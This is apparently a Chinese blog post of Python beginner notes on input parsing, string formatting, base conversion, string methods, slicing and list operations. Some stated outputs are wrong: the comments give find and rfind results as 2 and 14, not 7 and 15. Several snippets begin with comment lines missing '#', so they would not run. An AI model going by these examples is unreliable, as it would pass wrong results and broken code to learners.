<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="built_in">int</span>(<span class="built_in">input</span>())  <span class="comment"># 输入一个数字</span></span><br><span class="line"></span><br><span class="line">m, n = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())  <span class="comment"># 输入两个数字</span></span><br><span class="line"></span><br><span class="line">a, b = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split(<span class="string">&quot;#&quot;</span>))  <span class="comment"># 连续输入，井号间隔</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))  <span class="comment"># 一行输入无限多的整型数据，用 list 存储</span></span><br><span class="line"></span><br><span class="line">data3 = [<span class="built_in">int</span>(<span class="built_in">input</span>()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]  <span class="comment"># 多行 input 输入，存放在一个列表中</span></span><br><span class="line"></span><br><span class="line">data4 = [</span><br><span class="line">    <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)</span><br><span class="line">]  <span class="comment"># 相同的思想生成列表，存储为列表的列表</span></span><br><span class="line"></span><br><span class="line">data5 = [<span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"><span class="comment"># 列表推导式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    x = <span class="built_in">input</span>()</span><br><span class="line">    <span class="comment"># 连续输入</span></span><br><span class="line">    </span><br><span class="line">arr = <span class="built_in">input</span>().split()  <span class="comment"># 这里存储的是字符串型的列表</span></span><br><span class="line">arr = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))  <span class="comment"># 这里存储的是整型的列表</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">2.345</span></span><br><span class="line">a = <span class="built_in">str</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(a[<span class="number">0</span>:<span class="number">4</span>]) + <span class="number">1</span>)  <span class="comment"># 通过变成 str，不 4 舍 5 入，再 float 成数值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%.2f&quot;</span> % (<span class="built_in">float</span>(a)))  <span class="comment"># %.2f 直接 4 舍 5 入</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>记录一下没见过的 <a href="/posts/249dac9b">tuple</a> 函数的语法解释（元组）</p>
</li>
<li><p>记录一下 <a href="/posts/6bbcb18e">map</a> 函数的语法解释（迭代器）</p>
</li>
<li><p>记录一下 <a href="/posts/b46ab514#/">Python 中的列表推导式</a></p>
</li>
</ul>
<h3 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h3><h4 id="占位符详解"><a href="#占位符详解" class="headerlink" title="%占位符详解"></a>%占位符详解</h4><p>占位符主要用于填充格式问题，通过加入格式化字符串来控制输出的格式。在 Python 中，常见的占位符及其使用方式如下：</p>
<ul>
<li><code>%s</code>: 字符串的占位符，可以使用 <code>%s</code> 或者 <code>&#123;&#125;</code> 进行替换。例如：<code>&#39;&#123;:s&#125;&#39;.format(&#39;hello&#39;)</code>。</li>
<li><code>%d</code>: 整数的占位符，可以使用 <code>%d</code> 或者 <code>&#123;&#125;</code> 进行替换。例如：<code>&#39;&#123;:d&#125;&#39;.format(10)</code>。</li>
<li><code>%.2f</code>: 浮点数的占位符，控制保留小数点后两位，四舍五入。例如：<code>&#39;&#123;:.2f&#125;&#39;.format(3.14159)</code>。</li>
<li><code>%.2e</code>: 科学计数法的浮点数占位符，控制保留小数点后两位，以科学计数法表示。例如：<code>&#39;&#123;:.2e&#125;&#39;.format(1000)</code>。</li>
<li><code>%</code>：百分号占位符，用于在字符串中表示百分比。例如：<code>&#39;&#123;&#125;%&#39;.format(50)</code>。</li>
</ul>
<p>常见用法示例：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>))  <span class="comment"># 输出：Hello World</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The value is %d&#x27;</span> % <span class="number">42</span>)  <span class="comment"># 输出：The value is 42</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The value is &#123;:.2f&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="number">3.14159</span>))  <span class="comment"># 输出：The value is 3.14</span></span><br></pre></td></tr></table></figure></div>

<p>填充格式问题：</p>
<ul>
<li><code>&#123;:#x&#125;</code>: 控制输出十六进制格式，<code>#</code> 表示保留进制前缀。例如：<code>&#39;&#123;:#x&#125;&#39;.format(18)</code> 输出 <code>&#39;0x12&#39;</code>。</li>
<li><code>&#123;:0&gt;5&#125;</code>: 控制填充格式，在数字前填充指定字符，总长度为 5。例如：<code>&#39;&#123;:0&gt;5&#125;&#39;.format(&#39;33&#39;)</code> 输出 <code>&#39;00033&#39;</code>。</li>
</ul>
<p>总的来说，<code>format()</code> 方法可以将数值按照指定的格式进行格式化输出，其中格式化的方式由参数决定，常见的参数包括 <code>b</code>（二进制）、<code>x</code>（十六进制）、<code>o</code>（八进制）等。</p>
<h4 id="关于-format-函数"><a href="#关于-format-函数" class="headerlink" title="关于 format 函数"></a>关于 format 函数</h4><p><code>format()</code> 方法可以完全代替 <code>%</code> 格式化。实际上，Python 官方已经推荐使用 <code>format()</code> 方法进行字符串格式化，因为它提供了更多的功能和选项，并且更加灵活。<code>format()</code> 方法可以在格式化字符串中指定参数的顺序、精度、对齐方式等，而 <code>%</code> 格式化相对来说功能较为简单。</p>
<p>另外，从 Python 3.6 版本开始，引入了 f-string，它提供了一种更加简洁、直观的字符串格式化语法，更推荐在新的 Python 项目中使用。但是，即使使用 f-string，<code>format()</code> 方法仍然是一个非常有用的备选方法，特别是对于需要动态生成格式的情况。</p>
<p>当使用 <code>format()</code> 方法时，可以按照需要定义格式，并在字符串中插入对应的值。下面是一些示例：</p>
<ol>
<li><p><strong>基本用法</strong>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line">age = <span class="number">30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My name is &#123;&#125;, and I am &#123;&#125; years old.&quot;</span>.<span class="built_in">format</span>(name, age))</span><br><span class="line"><span class="comment"># 输出: My name is Alice, and I am 30 years old.</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>指定参数顺序</strong>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;1&#125; is &#123;0&#125; years old.&quot;</span>.<span class="built_in">format</span>(age, name))</span><br><span class="line"><span class="comment"># 输出: Alice is 30 years old.</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>指定精度</strong>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pi = <span class="number">3.14159265359</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The value of pi is &#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(pi))</span><br><span class="line"><span class="comment"># 输出: The value of pi is 3.14</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>对齐方式</strong>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">word = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#x27;&#123;:&gt;10&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(word))  <span class="comment"># 右对齐</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#x27;&#123;:&lt;10&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(word))  <span class="comment"># 左对齐</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#x27;&#123;:^10&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(word))  <span class="comment"># 居中对齐</span></span><br><span class="line"><span class="comment"># 输出: &#x27;     hello&#x27;</span></span><br><span class="line"><span class="comment"># 输出: &#x27;hello     &#x27;</span></span><br><span class="line"><span class="comment"># 输出: &#x27;  hello   &#x27;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>使用命名参数</strong>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My name is &#123;name&#125;, and I am &#123;age&#125; years old.&quot;</span>.<span class="built_in">format</span>(name=<span class="string">&quot;Bob&quot;</span>, age=<span class="number">25</span>))</span><br><span class="line"><span class="comment"># 输出: My name is Bob, and I am 25 years old.</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>格式化数字</strong>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">12345</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The number is &#123;:,&#125;&quot;</span>.<span class="built_in">format</span>(num))  <span class="comment"># 千位分隔符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The number is &#123;:b&#125;&quot;</span>.<span class="built_in">format</span>(num))  <span class="comment"># 二进制</span></span><br><span class="line"><span class="comment"># 输出: The number is 12,345</span></span><br><span class="line"><span class="comment"># 输出: The number is 11000000111001</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>进制转换</strong>：</p>
</li>
</ol>
<p><code>format()</code> 函数可以用于进制转换，通过指定格式来将整数以不同进制的形式进行输出。下面是关于进制转换的一些知识点：</p>
<ol>
<li><p><strong>基本用法</strong>：<br>使用 <code>format()</code> 函数，可以将整数按照指定的进制进行格式化输出。例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;二进制：&#123;:b&#125;&quot;</span>.<span class="built_in">format</span>(num))  <span class="comment"># 输出：二进制：10010</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;八进制：&#123;:o&#125;&quot;</span>.<span class="built_in">format</span>(num))  <span class="comment"># 输出：八进制：22</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;十六进制：&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(num))  <span class="comment"># 输出：十六进制：12</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>保留进制前缀</strong>：<br>使用 <code>#</code> 标志可以保留进制前缀，例如 <code>#b</code> 表示二进制、<code>#o</code> 表示八进制、<code>#x</code> 表示十六进制。例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;二进制（带前缀）：&#123;:#b&#125;&quot;</span>.<span class="built_in">format</span>(num))  <span class="comment"># 输出：二进制（带前缀）：0b10010</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;八进制（带前缀）：&#123;:#o&#125;&quot;</span>.<span class="built_in">format</span>(num))  <span class="comment"># 输出：八进制（带前缀）：0o22</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;十六进制（带前缀）：&#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(num))  <span class="comment"># 输出：十六进制（带前缀）：0x12</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>指定位数</strong>：<br>可以使用填充符和指定位数来控制输出的位数，例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;十六进制（固定位数）：&#123;:06x&#125;&quot;</span>.<span class="built_in">format</span>(num))  <span class="comment"># 输出：十六进制（固定位数）：000012</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>整数转换为不同进制的字符串</strong>：<br>如果只是想将整数转换为不同进制的字符串，也可以使用 <code>format()</code> 函数，但是在这种情况下，可以直接使用整数对象的进制转换方法，例如 <code>bin()</code>、<code>oct()</code>、<code>hex()</code>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">18</span></span><br><span class="line">binary_str = <span class="built_in">bin</span>(num)</span><br><span class="line">octal_str = <span class="built_in">oct</span>(num)</span><br><span class="line">hexadecimal_str = <span class="built_in">hex</span>(num)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;二进制字符串：&quot;</span>, binary_str)  <span class="comment"># 输出：二进制字符串： 0b10010</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;八进制字符串：&quot;</span>, octal_str)  <span class="comment"># 输出：八进制字符串： 0o22</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;十六进制字符串：&quot;</span>, hexadecimal_str)  <span class="comment"># 输出：十六进制字符串： 0x12</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<h3 id="str-类型的内建函数"><a href="#str-类型的内建函数" class="headerlink" title="str 类型的内建函数"></a>str 类型的内建函数</h3><ol>
<li><p><strong>大小写转换</strong>：</p>
<ul>
<li><code>S.lower()</code>: 将字符串 S 中的所有字符转换为小写。</li>
<li><code>S.upper()</code>: 将字符串 S 中的所有字符转换为大写。</li>
<li><code>S.swapcase()</code>: 将字符串 S 中的大小写互换。</li>
<li><code>S.capitalize()</code>: 将字符串 S 中的首字母转换为大写，其他字母转换为小写。</li>
<li><code>s.title()</code>: 将字符串 s 中每个单词的首字母转换为大写。</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;hello world&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s.lower())  <span class="comment"># 输出: hello world</span></span><br><span class="line"><span class="built_in">print</span>(s.upper())  <span class="comment"># 输出: HELLO WORLD</span></span><br><span class="line"><span class="built_in">print</span>(s.swapcase())  <span class="comment"># 输出: HELLO WORLD</span></span><br><span class="line"><span class="built_in">print</span>(s.capitalize())  <span class="comment"># 输出: Hello world</span></span><br><span class="line"><span class="built_in">print</span>(s.title())  <span class="comment"># 输出: Hello World</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>查找和替换</strong>：</p>
<ul>
<li><code>S.find(sub, start, end)</code>: 返回字符串 S 中子字符串 sub 第一次出现的索引，可指定搜索范围。</li>
<li><code>S.rfind(sub, start, end)</code>: 返回字符串 S 中子字符串 sub 最后一次出现的索引。</li>
<li><code>S.count(sub, start, end)</code>: 返回字符串 S 中子字符串 sub 出现的次数。</li>
<li><code>S.replace(old, new, count)</code>: 将字符串 S 中的 old 子字符串替换为 new，可以指定替换次数。</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;I love Python. Python is great.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s.find(<span class="string">&quot;Python&quot;</span>))  <span class="comment"># 输出: 2</span></span><br><span class="line"><span class="built_in">print</span>(s.rfind(<span class="string">&quot;Python&quot;</span>))  <span class="comment"># 输出: 14</span></span><br><span class="line"><span class="built_in">print</span>(s.count(<span class="string">&quot;Python&quot;</span>))  <span class="comment"># 输出: 2</span></span><br><span class="line"><span class="built_in">print</span>(s.replace(<span class="string">&quot;Python&quot;</span>, <span class="string">&quot;Java&quot;</span>))  <span class="comment"># 输出: I love Java. Java is great.</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>去除空白字符</strong>：</p>
<ul>
<li><code>S.strip(chars)</code>: 移除字符串 S 中指定的字符，默认移除空格。</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;  hello  &quot;</span></span><br><span class="line"><span class="built_in">print</span>(s.strip())  <span class="comment"># 输出: hello</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>分割和连接</strong>：</p>
<ul>
<li><code>S.split(sep, maxsplit)</code>: 使用分隔符 sep 将字符串 S 分割成一个列表，maxsplit 指定分割次数。</li>
<li><code>S.join(iterable)</code>: 将可迭代对象中的字符串连接起来，以字符串 S 作为连接符。</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;hello-world&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s.split(<span class="string">&quot;-&quot;</span>))  <span class="comment"># 输出: [&#x27;hello&#x27;, &#x27;world&#x27;]</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;-&#x27;</span></span><br><span class="line">b = [<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(a.join(b))  <span class="comment"># 输出: hello-world</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<h3 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h3><p><strong>Print()</strong></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)<span class="comment">#打印在一行</span></span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#换行符结尾</span></span><br></pre></td></tr></table></figure></div>

<h3 id="切片语法"><a href="#切片语法" class="headerlink" title="切片语法"></a>切片语法</h3><ol>
<li><strong>切片语法</strong>：<code>a[起点:终点:步长]</code>。它允许你从列表或字符串中获取一个子集，并且可以指定步长。</li>
</ol>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">从列表中获取索引为 <span class="number">1</span> 到索引为 <span class="number">3</span>（不包括 <span class="number">3</span>）的子集，步长为 <span class="number">1</span></span><br><span class="line">a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">3</span>])  <span class="comment"># 输出: [1, 2]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从字符串中获取索引为 1 到索引为 4（不包括 4）的子集，步长为 1</span></span><br><span class="line">s = <span class="string">&quot;abcdef&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">1</span>:<span class="number">4</span>])  <span class="comment"># 输出: &quot;bcd&quot;</span></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li><strong>切片对象</strong>：切片对象可以应用于列表和字符串，但不能应用于整数。例如，<code>a = 5</code>, <code>a[1:3]</code> 是无效的，但可以通过 <code>a = [5]</code> 来创建一个列表，然后进行切片操作。</li>
</ol>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">列表切片</span><br><span class="line">a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">slice_obj = <span class="built_in">slice</span>(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(a[slice_obj])  <span class="comment"># 输出: [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串切片</span></span><br><span class="line">s = <span class="string">&quot;abcdef&quot;</span></span><br><span class="line">slice_obj = <span class="built_in">slice</span>(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(s[slice_obj])  <span class="comment"># 输出: &quot;bcd&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>在这里 <code>slice</code> 是 Python 内置函数，用于创建一个切片对象，该对象可以被应用于可切片对象（比如列表、字符串等）的索引或切片操作中。它接受三个参数：起点、终点和步长，用来指定切片的范围和步长。</p>
<ol start="3">
<li><strong>起点和终点</strong>：切片包含起点，但不包含终点。即，<code>a[1:3]</code> 将会包含索引为 1 和 2 的元素，但不包含索引为 3 的元素。</li>
</ol>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="comment"># 从索引为 1 到索引为 4（不包括 4）的子集，步长为 1</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">4</span>])  <span class="comment"># 输出: [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从索引为 2 到索引为 5（不包括 5）的子集，步长为 1</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>:<span class="number">5</span>])  <span class="comment"># 输出: [2, 3, 4]</span></span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li><strong>步长的默认值</strong>：当未指定步长时，默认为 1。如果步长为负数，则从右向左提取元素。</li>
</ol>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="comment"># 从索引为 0 到索引为 4（不包括 4）的子集，默认步长为 1</span></span><br><span class="line"><span class="built_in">print</span>(a[:<span class="number">4</span>])  <span class="comment"># 输出: [0, 1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从索引为 2 到列表末尾的子集，默认步长为 1</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>:])  <span class="comment"># 输出: [2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure></div>

<ol start="5">
<li><strong>负数索引</strong>：负数索引表示从右往左的偏移量。例如，<code>a[-1]</code> 表示最后一个元素。</li>
</ol>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="comment"># 从倒数第二个元素到列表末尾的子集，默认步长为 1</span></span><br><span class="line"><span class="built_in">print</span>(a[-<span class="number">2</span>:])  <span class="comment"># 输出: [4, 5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从倒数第四个元素到倒数第二个元素的子集，默认步长为 1</span></span><br><span class="line"><span class="built_in">print</span>(a[-<span class="number">4</span>:-<span class="number">2</span>])  <span class="comment"># 输出: [2, 3]</span></span><br></pre></td></tr></table></figure></div>

<h3 id="数字运算"><a href="#数字运算" class="headerlink" title="数字运算"></a>数字运算</h3><p>这些知识点主要涉及数字运算，包括取余运算、整除运算以及数字的逆序输出。以下是这些知识点的总结：</p>
<ol>
<li><p><strong>取余运算</strong>（%）：取一个数除以另一个数的余数，这里后面跟着的数字是 10，所以结果都在 0 到 9 之间。</p>
<ul>
<li>例如：a % 10 取得 a 的个位数。</li>
</ul>
</li>
<li><p><strong>整除运算</strong>（&#x2F;&#x2F;）：取一个数除以另一个数的整数部分，相当于向下取整。</p>
<ul>
<li>例如：a &#x2F;&#x2F; 10 取得 a 的除了个位的其他位组成的数。</li>
</ul>
</li>
<li><p><strong>逆序输出</strong>：给定一个整数，以逆序输出各个位上的数字。</p>
<ul>
<li>例如：对于数字 25165，逆序输出为 5, 6, 1, 5, 2。</li>
</ul>
</li>
</ol>
<p>根据上述知识点，代码执行如下：</p>
<ul>
<li><p>对于输入的数字 32345：</p>
<ul>
<li>个位：32345 % 10 &#x3D; 5</li>
<li>十位：32345 &#x2F;&#x2F; 10 % 10 &#x3D; 4</li>
<li>百位：32345 &#x2F;&#x2F; 100 % 10 &#x3D; 3</li>
<li>千位：32345 &#x2F;&#x2F; 1000 % 10 &#x3D; 2</li>
<li>万位：32345 &#x2F;&#x2F; 10000 &#x3D; 3</li>
<li>所以，逆序输出为 5, 4, 3, 2, 3</li>
</ul>
</li>
<li><p>对于输入的数字 25165：</p>
<ul>
<li>个位：25165 % 10 &#x3D; 5</li>
<li>十位：25165 &#x2F;&#x2F; 10 % 10 &#x3D; 6</li>
<li>百位：25165 &#x2F;&#x2F; 100 % 10 &#x3D; 1</li>
<li>千位：25165 &#x2F;&#x2F; 1000 % 10 &#x3D; 5</li>
<li>万位：25165 &#x2F;&#x2F; 10000 &#x3D; 2</li>
<li>所以，逆序输出为 5, 6, 1, 5, 2</li>
</ul>
</li>
</ul>
<p>下面是逆序的一个例子</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">输入数字</span><br><span class="line">number = <span class="number">32345</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算并逆序输出每一位数字</span></span><br><span class="line">reverse_digits = []</span><br><span class="line"><span class="keyword">while</span> number &gt; <span class="number">0</span>:</span><br><span class="line">    digit = number % <span class="number">10</span>  <span class="comment"># 取个位数字</span></span><br><span class="line">    reverse_digits.append(digit)</span><br><span class="line">    number //= <span class="number">10</span>  <span class="comment"># 去除个位数字</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;逆序输出每位数字:&quot;</span>, reverse_digits)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用逆序的方式输出每位数字</span></span><br><span class="line"><span class="keyword">for</span> digit <span class="keyword">in</span> <span class="built_in">reversed</span>(reverse_digits):</span><br><span class="line">    <span class="built_in">print</span>(digit, end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>输出结果：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">逆序输出每位数字: [5, 4, 3, 2, 3]</span><br><span class="line">5 4 3 2 3 </span><br></pre></td></tr></table></figure></div>

<p>同样，这个示例也适用于其他数字，只需将 <code>number</code> 变量的值更改为所需的数字即可。</p>
<h3 id="二维列表操作"><a href="#二维列表操作" class="headerlink" title="二维列表操作"></a>二维列表操作</h3><h4 id="创建二维列表"><a href="#创建二维列表" class="headerlink" title="创建二维列表"></a>创建二维列表</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]]</span><br></pre></td></tr></table></figure></div>

<h4 id="列表拼接"><a href="#列表拼接" class="headerlink" title="列表拼接"></a>列表拼接</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">lista = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">listb = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">result = lista + listb</span><br></pre></td></tr></table></figure></div>

<h4 id="列表扩展"><a href="#列表扩展" class="headerlink" title="列表扩展"></a>列表扩展</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">lista = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">lista.extend([<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>])</span><br></pre></td></tr></table></figure></div>

<h4 id="插入元素"><a href="#插入元素" class="headerlink" title="插入元素"></a>插入元素</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">lista = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">lista.insert(<span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="移除元素"><a href="#移除元素" class="headerlink" title="移除元素"></a>移除元素</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">lista = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">lista.remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="查找元素索引"><a href="#查找元素索引" class="headerlink" title="查找元素索引"></a>查找元素索引</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">lista = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">index = lista.index(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></div>

